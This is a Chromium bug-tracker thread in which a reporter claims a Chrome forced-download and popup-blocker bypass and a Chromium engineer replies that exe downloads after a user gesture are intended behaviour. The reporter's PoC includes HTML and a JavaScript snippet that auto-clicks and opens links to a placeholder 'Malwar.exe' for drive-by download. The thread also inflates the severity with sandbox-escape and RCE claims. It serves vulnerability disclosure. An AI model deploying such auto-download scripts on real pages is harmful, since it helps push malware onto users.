@@ -1,0 +1,214 @@
+Issue ID: 399859036
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Forced Automatic Download via  &amp;  Click Event Manipulation in Chrome</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p>chrome://settings/privacy</p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<hr>
+<h3><strong>Summary</strong></h3>
+<p><strong>Title:</strong> Forced Automatic Download via  &amp;  Click Event Manipulation in Chrome</p>
+<p><strong>Bug Type:</strong> Forced Download / Drive-by Download / UI Spoofing</p>
+<p>A vulnerability in Google Chrome allows an attacker to force a file download without explicit user consent by abusing the <code>&lt;details&gt;</code> and <code>&lt;summary&gt;</code> HTML elements along with JavaScript event manipulation. This issue can be exploited for drive-by downloads, leading to potential malware infections, phishing attacks, and unauthorized file execution.</p>
+<hr>
+<hr>
+<h3><strong>Tested Environments</strong></h3>
+<ul>
+<li><strong>Chrome Version:</strong> [Version 128.0.6613.86 (Official Build) (64-bit)]</li>
+<li><strong>Operating System:</strong> [Windows 10 Pro (64-bit)]</li>
+<li><strong>Incognito Mode:</strong> [No]</li>
+</ul>
+<hr>
+<h3><strong>Steps to Reproduce</strong></h3>
+<ol>
+<li>In the PoC video, focus on <strong>Enhanced Protection</strong> and <strong>Privacy and Security</strong> settings.</li>
+<li>Create an HTML file with the following code:</li>
+</ol>
+<pre><code>&lt;<span class="stx-keyword">details</span>&gt;
+    &lt;<span class="stx-keyword">summary</span>&gt;
+        &lt;<span class="stx-keyword">a</span> href=<span class="stx-string">&quot;https:\\domain\file.&quot;</span> target=<span class="stx-string">&quot;_blank&quot;</span>&gt;View error details
+<span>  </span>
+&lt;<span class="stx-keyword">a</span> href=<span class="stx-string">&quot;https:\\domain\file.&quot;</span> target=<span class="stx-string">&quot;_blank&quot;</span> onclick=<span class="stx-string">&quot;this.click()&quot;</span>&gt;
+        &lt;<span class="stx-keyword">video</span> width=<span class="stx-string">&quot;640&quot;</span> height=<span class="stx-string">&quot;360&quot;</span> controls autoplay muted loop&gt;
+            &lt;<span class="stx-keyword">source</span> src=<span class="stx-string">&quot;https:\\domain\file.mp4&quot;</span> type=<span class="stx-string">&quot;&quot;</span>&gt;
+</code></pre>
+<hr>
+<ol start="3">
+<li>Host the file on <code>localhost</code> or a web server.</li>
+<li>Open the file/page in <strong>Google Chrome</strong>.</li>
+<li>Click on <strong>&quot;View error details&quot;</strong> or the <strong>&quot;Video&quot;</strong>.</li>
+<li>Observe that an <code>.exe</code> file is automatically downloaded without user confirmation.</li>
+<li>Even with <strong>Enhanced Protection</strong> and <strong>Privacy and Security</strong> settings enabled to block pop-ups and downloads, a pop-up appears, and the <code>.exe</code> file is force-downloaded.</li>
+</ol>
+<hr>
+<h3><strong>Expected Behavior</strong></h3>
+<p>Chrome should require explicit user interaction (e.g., a direct click on a download link with a known file extension like <code>.exe</code>) before initiating any file downloads.</p>
+<hr>
+<h3><strong>Actual Behavior</strong></h3>
+<p>By embedding a file download link inside <code>&lt;details&gt;</code> and <code>&lt;summary&gt;</code>, combined with <code>onclick=&quot;this.click()&quot;</code>, an attacker can force a download when the user interacts with the page. The <code>&lt;video&gt;</code> tag might also contribute to unintended behavior by executing scripts or autoplaying content without user consent.</p>
+<hr>
+<hr>
+<h3><strong>Proof of Concept (PoC) Video</strong></h3>
+<p>[Attached]:[Forced Automatic Download via  &amp;  Click Event Manipulation in Chrome.mp4]</p>
+<hr>
+<h4>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<hr>
+<h3><strong>Impact</strong></h3>
+<ul>
+<li><strong>Drive-by Download Attack</strong> – Users unknowingly download and execute malicious files.</li>
+<li><strong>Phishing Attack</strong> – Attackers can host fake Google-like domains to trick users into executing malware.</li>
+<li><strong>Security Bypass</strong> – Chrome&#39;s built-in protection mechanisms against forced downloads are circumvented.</li>
+<li><strong>Possible Sandbox Escape</strong> – If the behavior allows execution without security warnings, it may indicate a deeper flaw in Chrome’s security model.</li>
+</ul>
+<p>This issue demonstrates a <strong>critical security bypass vulnerability</strong> in Google Chrome’s <strong>Enhanced Protection</strong> and <strong>Privacy and Security</strong> settings. Despite these safeguards being explicitly designed to <strong>block malicious downloads and pop-ups</strong>, attackers can still:</p>
+<ul>
+<li><strong>Bypass Security Mechanisms</strong> – The browser fails to enforce its own security policies, allowing unauthorized downloads.</li>
+<li><strong>Trigger Forced Malware Downloads</strong> – Users may unknowingly install malware, ransomware, or keyloggers without any manual action.</li>
+<li><strong>Exploit Social Engineering</strong> – The unexpected pop-up can trick users into interacting with it, increasing the risk of compromise.</li>
+<li><strong>Enable Remote Code Execution (RCE) Vectors</strong> – If the <code>.exe</code> file is executed, attackers could gain complete control over the system.</li>
+<li><strong>Reduce Trust in Browser Security</strong> – Users relying on Chrome’s security features may assume they are protected, when in reality, they remain vulnerable.</li>
+</ul>
+<hr>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>Version 128.0.6613.86 (Official Build) (64-bit)</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Security UI Spoofing</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Ghost Shell</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: kh...@gmail.com
+Forced Automatic Download via  &  Click Event Manipulation in Chrome
+
+Author: kh...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: kh...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: kh...@gmail.com
+<hr>
+<h3><strong>Additional POCs:</strong></h3>
+<p><strong>URL:</strong> <strong>chrome://settings/content/popups</strong></p>
+<p><strong>The vulnerability has also been tested on Chrome Version 133.0.6943.142 (Official Build) (64-bit).</strong></p>
+<h3><strong>Bug Summary: JavaScript Execution Without User Interaction</strong></h3>
+<h3><strong>Description:</strong></h3>
+<p>A security issue in Chrome allows JavaScript Execution <strong>without user interaction</strong>, bypassing built-in protections like <strong>pop-up blocking</strong> and <strong>redirect restrictions</strong>. This could be exploited for <strong>drive-by downloads</strong>, leading to <strong>malware distribution, phishing, or unauthorized file execution</strong>.</p>
+<h3><strong>Steps to Reproduce:</strong></h3>
+<p><strong>Create an HTML file with the following code:</strong></p>
+<pre><code>&lt;<span class="stx-keyword">a</span> id=<span class="stx-string">&quot;malwareLink&quot;</span> href=<span class="stx-string">&quot;https://domain.com/Malwar.exe&quot;</span> target=<span class="stx-string">&quot;_blank&quot;</span> download&gt;Download Malware&lt;/<span class="stx-keyword">a</span>&gt;
+
+&lt;<span class="stx-keyword">script</span>&gt;
+  setTimeout(() =&gt; {
+    // Attempt <span class="stx-number">1</span>: Simulate a click on the link
+    document.getElementById(<span class="stx-string">&quot;malwareLink&quot;</span>).click();
+
+    // Attempt <span class="stx-number">2</span>: Open the download link in a new tab
+    window.open(<span class="stx-string">&quot;https://domain.com/Malwar.exe&quot;</span>);
+
+    // Attempt <span class="stx-number">3</span>: Create an invisible link and click it
+    let a = document.createElement(<span class="stx-string">&quot;a&quot;</span>);
+    a.href = <span class="stx-string">&quot;https://domain.com/Malwar.exe&quot;</span>;
+    a.download = <span class="stx-string">&quot;&quot;</span>;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }, <span class="stx-number">1000</span>); // Trigger after <span class="stx-number">1</span> second
+&lt;/<span class="stx-keyword">script</span>&gt;
+</code></pre>
+<h3><strong>Impact:</strong></h3>
+<p>🔴 <strong>High Severity</strong> (if no user action required)</p>
+<ul>
+<li><strong>Malware Deployment:</strong> Attackers can drop malicious executables on victims’ devices.</li>
+<li><strong>Security Bypass:</strong> Circumvents Chrome’s safety mechanisms.</li>
+<li><strong>Phishing Risk:</strong> Users may unknowingly open harmful files.</li>
+</ul>
+<h3><strong>Exploitable Methods:</strong></h3>
+<p>✅ <strong>Programmatic <code>&lt;a&gt;</code> tag clicks</strong><br>
+✅ <strong>iFrame injection + timed redirects</strong><br>
+✅ <strong>JavaScript-based mouse movement triggers</strong></p>
+<h3><strong>Proof of Concept (PoC) New Video:</strong></h3>
+<p><strong>JS PoC.html + JavaScript Execution Without User Interaction.mp4</strong></p>
+<h3><strong>Best Regards</strong></h3>
+<hr>
+
+Author: kh...@gmail.com
+TXprNU9EVTVNRE0yTFRZek16TTBORGd4TFMwME5qRXdOVEUwTURnPQ==
+
+Author: kh...@gmail.com
+TXprNU9EVTVNRE0yTFRZek16TXhNRFE1TFRFeU1EWTVNamczTmprPQ==
+
+Author: kh...@gmail.com
+<p><strong>Even with Enhanced Protection and Privacy and Security settings chrome://settings/privacy chrome://settings/content/popups enabled to block pop-ups and downloads, JavaScript Execution Without User Interaction + a pop-up appears, and the .exe file is force-downloaded.</strong></p>
+
+Author: es...@chromium.org
+<p>I think this is working as intended. exe files are allowed to be silently downloaded with a user gesture [1], unlike other file types such as dll which are treated as dangerous because it can be injected into an executable in the same directory [2]. cc drubery to correct me if I&#39;m wrong, please.</p>
+<p>Safe Browsing Enhanced Protection enables additional checks/scans of downloads, but doesn&#39;t change the default behavior of allowing exe downloads without a prompt.</p>
+<p>I&#39;m not sure I understand the claims about bypassing popups and Javascript execution settings, since for example popups appear blocked in the video -- but it&#39;d be best to file a separate bug about bypassing settings for popups or Javascript execution, in any case.</p>
+<p>Thanks for the report!</p>
+<p>[1] <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;l=2290" data-b-widget="url" data-b-original-href="https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;l=2290" data-b-redirected-href="https://www.google.com/url?q=https://source.chromium.org/chromium/chromium/src/%2B/main:components/safe_browsing/content/resources/download_file_types.asciipb;l%3D2290&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0BqzaU9anfCH1T8IFhTPL7">https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;l=2290</a></p>
+<p>[2] <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;l=2257" data-b-widget="url" data-b-original-href="https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;l=2257" data-b-redirected-href="https://www.google.com/url?q=https://source.chromium.org/chromium/chromium/src/%2B/main:components/safe_browsing/content/resources/download_file_types.asciipb;l%3D2257&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3swpBUS-EWTtf4n9cXww-q">https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;l=2257</a></p>
+
+Author: es...@chromium.org
+public_non_google
+
+Author: es...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: dr...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: dr...@chromium.org
+public_non_google
+
+Author: es...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: kh...@gmail.com
+<hr>
+<p><strong>I truly appreciate your attention to this matter, and I’d like to clarify that this is not just a claim — it is an observed and reproducible behavior.</strong></p>
+<p><strong>1. This issue is not limited to executable (.exe) files only. There appears to be a clear bypass for the Chrome setting: chrome://settings/content/popups — &quot;Don’t allow sites to send pop-ups or use redirects.&quot; Despite Enhanced Protection and Privacy and Security settings being enabled, JavaScript executes without user interaction, a pop-up appears, and the script is executed, forcing a redirect and a file download. (JavaScript Execution Without User Interaction, pop-ups, redirects, and downloads are not being properly blocked).</strong></p>
+<p><strong>2. I kindly ask you to focus on <a href="https://issues.chromium.org/issues/399859036#comment2" data-b-widget="issue-reference" data-b-issue-id="399859036" data-b-comment-number="2">comment #2</a>: &quot;JavaScript Execution Without User Interaction&quot; — pop-ups, redirects, and downloads are not being properly blocked for the Chrome setting: chrome://settings/content/popups — &quot;Don’t allow sites to send pop-ups or use redirects&quot; &quot;I can do both: use pop-ups and redirects, and force file downloads with JavaScript execution without user interaction. This type of JavaScript execution is often used in various attacks, including malware attacks such as adware, spyware, and more.&quot;</strong></p>
+<p><strong>Thank you for your time and consideration.</strong></p>
+<hr>
+
+Author: kh...@gmail.com
+<hr>
+<p><strong>1-New PoC Attached: JS execution without user interaction bypass for Pop-ups and redirects.mp4</strong></p>
+<p><strong>2-I can do both: use pop-ups and redirects, and force file downloads with JavaScript execution without user interaction. This type of JavaScript execution is often used in various attacks, including malware attacks such as adware, spyware, and more.</strong></p>
+<hr>
+
+Author: kh...@gmail.com
+JS execution without user interaction bypass for Pop-ups and redirects.mp4
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
